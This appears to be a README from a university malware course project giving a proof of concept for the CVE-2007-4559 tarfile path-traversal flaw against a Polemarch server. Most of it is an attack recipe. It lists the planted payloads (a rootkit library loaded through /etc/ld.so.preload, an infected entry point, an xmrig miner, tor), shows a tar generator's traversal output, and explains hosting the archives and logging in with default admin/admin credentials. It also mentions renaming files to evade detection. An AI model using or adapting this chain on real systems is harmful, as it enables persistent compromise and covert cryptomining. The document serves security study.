# MALW
Malware UPC

## Set up

### Docker
```bash
$: docker compose build 
$: docker compose up -d
```

Polemarch server available at http://localhost:8080

### Vagrant
```bash
$: vagrant up
```

Polemarch server available at http://localhost:8085

## POC
Proof of concept using https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559 
and based on the work from https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html.

### Directories to attack
We want to be able to deploy the following files:

- /usr/local/lib
  - -> **rootkit.so**: library to load
- /etc
  - -> **ld.so.preload**: library to load before any other library
- /opt/polemarch/bin
  - -> **polemarchctl**: infected docker entry point
- /usr/bin
  - -> **xmring**: miner
  - -> **tor**: tor

Note: in the real exploit we would change some names to avoid detection.

### Notes
- Binary files MUST have executable permissions
- Tar's can not be deployed twice
- Malware will be placed in an auxiliar folder which will be symlinked to target folder

## Instructions
In order to deploy the malware we will have to set up:

- Polemarch server 
- Server hosting the compromised tar files

First, deploy the polemarch server (with vagrant or docker):

Generate the tar files and host the tar files (example using python localhost server). Configure the server to listen in an interface
accesible from the docker container:

```bash
$: cd poc

# Copy tor and xmrig binaries
$: cp ../cryptominer/tor .
$: cp ../cryptominer/xmrig .

# Execute tar files generator
$: python3 tar.py
[*] Creating symlink aaaa -> etc/
[*] Creating symlink bbbb -> usr/local/lib/
[*] Creating symlink cccc -> usr/bin/
[*] Creating symlink dddd -> opt/polemarch/bin/
[*] Changing aaaa to ../../../../../../../../../test/aaaa
[*] Changing bbbb to ../../../../../../../../../test/bbbb
[*] Changing cccc to ../../../../../../../../../test/cccc
[*] Changing dddd to ../../../../../../../../../test/dddd
[*] Changing ld.so.preload to ../../../../../../../../../test/aaaa/ld.so.preload
[*] Changing rootkit.so to ../../../../../../../../../test/bbbb/rootkit.so
[*] Changing tor to ../../../../../../../../../test/cccc/tor
[*] Changing xmrig to ../../../../../../../../../test/cccc/xmrig
[*] Changing polemarchctl to ../../../../../../../../../test/dddd/polemarchctl
[*] Removing symlink aaaa
[*] Removing symlink bbbb
[*] Removing symlink cccc
[*] Removing symlink dddd

# Server python server from tar directory
$: cd tar
$: python -m http.server 3005
```

Log in to the polemarch server using default password (admin/admin) and
create a project with a the compromised tar file:

![Project](./images/project.png)

"Sync" the project, which will untar untar our compromised tar.

Note: the server hosting IP must be accessible from the docker of virtual machine
